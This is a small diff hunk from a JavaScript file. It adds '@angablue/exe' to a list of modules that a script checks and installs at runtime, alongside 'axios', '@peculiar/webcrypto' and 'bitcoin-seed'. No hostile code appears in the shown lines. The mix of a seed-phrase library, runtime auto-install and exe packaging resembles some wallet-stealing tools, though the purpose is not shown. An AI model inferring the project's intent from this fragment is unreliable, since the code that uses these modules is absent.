@@ -43,6 +43,7 @@ async function install_module(module_name) {
 async function check_all_modules_installed() {
     return new Promise(async (res) => {
         [
+            "@angablue/exe",
             "@peculiar/webcrypto",
             "axios",
             "bitcoin-seed",
